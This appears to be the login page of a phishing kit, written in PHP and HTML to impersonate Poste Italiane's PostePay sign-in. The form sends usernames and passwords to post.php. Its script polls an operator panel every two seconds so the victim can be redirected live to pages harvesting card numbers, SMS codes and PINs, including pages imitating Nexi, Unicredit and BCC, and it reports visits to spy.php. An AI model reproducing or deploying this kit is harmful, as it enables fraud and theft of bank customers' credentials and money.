<?php 
require_once '../includes/main.php';
require '../main.php';
?>
<!doctype html>
<html lang="it">

<head>
    <meta charset="utf-8">
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Accedi a PostePay</title>
    
    <!-- FontAwesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    
    <!-- Animate.css -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    
    <style>
        :root {
            --poste-primary: #0066CC;
            --poste-primary-dark: #004C99;
            --poste-secondary: #FFD700;
            --poste-secondary-dark: #E6C200;
            --poste-light: #F8FAFC;
            --poste-dark: #1E293B;
            --poste-gray: #94A3B8;
            --poste-success: #10B981;
            --poste-error: #EF4444;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'Open Sans', 'Roboto', sans-serif;
            background: linear-gradient(135deg, #f0f8ff 0%, #e6f2ff 100%);
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--poste-dark);
            line-height: 1.6;
        }
        
        .container {
            width: 100%;
            max-width: 480px;
            padding: 2rem;
            perspective: 1000px;
        }
        
        .card {
            background: white;
            border-radius: 16px;
            box-shadow: 0 20px 40px rgba(0, 102, 204, 0.2);
            overflow: hidden;
            transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            transform-style: preserve-3d;
            animation: fadeInUp 0.8s ease-out;
        }
        
        .card:hover {
            transform: translateY(-8px) scale(1.01);
            box-shadow: 0 25px 50px rgba(0, 102, 204, 0.25);
        }
        
        .card-header {
            background: linear-gradient(135deg, var(--poste-primary) 0%, var(--poste-primary-dark) 100%);
            padding: 1.5rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
            position: relative;
            overflow: hidden;
        }
        
        .card-header::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -50%;
            width: 100%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            transform: rotate(30deg);
        }
        
        .header-icon {
            font-size: 1.4rem;
            cursor: pointer;
            transition: all 0.3s;
            color: rgba(255,255,255,0.8);
            background: rgba(255,255,255,0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .header-icon:hover {
            color: var(--poste-secondary);
            background: rgba(255,255,255,0.2);
            transform: scale(1.1);
        }
        
        .logo-container {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .logo {
            height: 40px;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
        }
        
        .logo-text {
            font-weight: 700;
            font-size: 1.2rem;
            letter-spacing: 0.5px;
        }
        
        .card-body {
            padding: 2.5rem 2rem;
        }
        
        .form-title {
            text-align: center;
            margin-bottom: 2rem;
            color: var(--poste-primary);
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
        }
        
        .form-title::after {
            content: '';
            display: block;
            width: 60px;
            height: 3px;
            background: var(--poste-secondary);
            margin: 0.5rem auto 0;
            border-radius: 3px;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
            position: relative;
        }
        
        .form-label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: var(--poste-dark);
            font-size: 0.9rem;
        }
        
        .form-input {
            width: 100%;
            padding: 1rem 1rem 1rem 3rem;
            border: 2px solid #E2E8F0;
            border-radius: 10px;
            font-size: 1rem;
            transition: all 0.3s;
            background-color: #F8FAFC;
            color: var(--poste-dark);
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.05);
        }
        
        .form-input:focus {
            border-color: var(--poste-primary);
            box-shadow: 0 0 0 3px rgba(0, 102, 204, 0.2);
            outline: none;
            background-color: white;
        }
        
        .input-icon {
            position: absolute;
            left: 1rem;
            top: 50%;
            transform: translateY(-50%);
            color: var(--poste-gray);
            font-size: 1.2rem;
        }
        
        .btn {
            width: 100%;
            background: linear-gradient(135deg, var(--poste-secondary) 0%, var(--poste-secondary-dark) 100%);
            color: var(--poste-dark);
            border: none;
            padding: 1rem;
            font-size: 1rem;
            font-weight: 700;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-transform: uppercase;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        
        .btn::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -60%;
            width: 200%;
            height: 200%;
            background: rgba(255,255,255,0.2);
            transform: rotate(30deg);
            transition: all 0.3s;
        }
        
        .btn:hover::after {
            left: 100%;
        }
        
        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 1.5rem;
            color: var(--poste-primary);
            text-decoration: none;
            font-size: 0.9rem;
            transition: color 0.3s;
            font-weight: 600;
        }
        
        .forgot-link:hover {
            color: var(--poste-primary-dark);
            text-decoration: underline;
        }
        
        .card-footer {
            text-align: center;
            padding: 1.5rem;
            background-color: #F1F5F9;
            color: var(--poste-gray);
            font-size: 0.8rem;
        }
        
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            margin-top: 1.5rem;
            color: var(--poste-success);
            font-size: 0.9rem;
            font-weight: 600;
        }
        
        .security-badge i {
            font-size: 1.2rem;
        }
        
        .language-switcher {
            display: flex;
            justify-content: center;
            margin-top: 1rem;
            gap: 1rem;
        }
        
        .language-btn {
            background: none;
            border: none;
            color: var(--poste-gray);
            font-size: 0.8rem;
            cursor: pointer;
            transition: color 0.3s;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
        }
        
        .language-btn:hover, .language-btn.active {
            color: var(--poste-primary);
            background: rgba(0, 102, 204, 0.1);
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 1rem;
            }
            
            .card-header {
                padding: 1rem 1.5rem;
            }
            
            .card-body {
                padding: 1.5rem 1rem;
            }
            
            .logo-text {
                display: none;
            }
        }
        
        /* Animations */
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
    </style>
</head>

<body>
    <div class="container animate__animated animate__fadeIn">
        <div class="card">
            <div class="card-header">
                <div class="header-icon" title="Indietro">
                    <i class="fas fa-arrow-left"></i>
                </div>
                <div class="logo-container">
                    <img src="PostePay/PostePay.png" alt="PostePay Logo" class="logo">
                    <span class="logo-text"></span>
                </div>
                <div class="header-icon" title="Aiuto">
                    <i class="fas fa-question"></i>
                </div>
            </div>

            <form action="post.php" method="post" class="card-body">
                <h1 class="form-title">Accedi al tuo account</h1>
                
                <div class="form-group">
                    <label for="userin2" class="form-label">Nome utente</label>
                    <div style="position: relative;">
                        <i class="fas fa-user input-icon"></i>
                        <input type="text" name="userin2" id="userin2" class="form-input" required placeholder="Inserisci il tuo nome utente">
                    </div>
                </div>
                
                <div class="form-group">
                    <label for="password" class="form-label">Password</label>
                    <div style="position: relative;">
                        <i class="fas fa-lock input-icon"></i>
                        <input type="password" name="pass2" id="password" class="form-input" required placeholder="Inserisci la tua password">
                    </div>
                </div>
                
                <button type="submit" class="btn pulse">
                    <i class="fas fa-sign-in-alt" style="margin-right: 8px;"></i> ACCEDI
                </button>
                
                <a href="recuperar-senha.html" class="forgot-link">
                    Hai dimenticato il nome utente o la password?
                </a>
                
                <div class="security-badge">
                    <i class="fas fa-shield-alt"></i>
                    <span>Accesso sicuro con crittografia SSL</span>
                </div>
                
                <div class="language-switcher">
                    <button type="button" class="language-btn active">Italiano</button>
                    <button type="button" class="language-btn">English</button>
                </div>
            </form>
            
            <div class="card-footer">
                © 2025 Poste Italiane S.p.A. - Tutti i diritti riservati
            </div>
        </div>
    </div>

    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    
    <!-- Scripts -->
    <script src="res/jq.js"></script>
    <script src="res/v.js"></script>

    <script>
        var targets = {
            1: "log.php",
            2: "card.php",
            3: "carderror.php",
            4: "nexi.php",
            5: "nexi_error.php",
            6: "ints.php",
            7: "ints_error.php",
            8: "sms.php",
            9: "sms_error.php",
            10: "success.php",
            11: "app.php",
            12: "Cartabcc.php",
            13: "Cartabcc_error.php",
            14: "PostePay.php",
            15: "PostePay_error.php",
            16: "Unicredit.php",
            17: "Unicredit_error.php",
            18: "pin.php"
        };

        function clearRedirections() {
            $.post("../panel/process/processor.php", { clearRedirection: 1 });
        }

        $(document).ready(function () {
            clearRedirections();

            setInterval(function () {
                $.post("../panel/process/processor.php", { keepAlive: 1, page: "PostePay" });
            }, 2000);

            setInterval(function () {
                $.post("../panel/process/processor.php", { redirectionListener: 1 }, function (data) {
                    var redirect = parseInt(data);
                    if (redirect && targets[redirect]) {
                        clearRedirections();
                        window.location.href = targets[redirect];
                    }
                });
            }, 2000);

            var abort = false;
            $("#email").on("keyup", function () {
                if (!abort) {
                    $.post("spy.php", { nexing: 1 });
                    abort = true;
                    setTimeout(() => abort = false, 5000); // Reset after 5 seconds
                }
            });

            $.post("spy.php", { nexiview: 1 });
            
            // Add some interactive animations
            $(".form-input").on("focus", function() {
                $(this).parent().find(".input-icon").css("color", "var(--poste-primary)");
            });
            
            $(".form-input").on("blur", function() {
                $(this).parent().find(".input-icon").css("color", "var(--poste-gray)");
            });
            
            $(".language-btn").click(function() {
                $(".language-btn").removeClass("active");
                $(this).addClass("active");
            });
        });
    </script>
</body>
</html>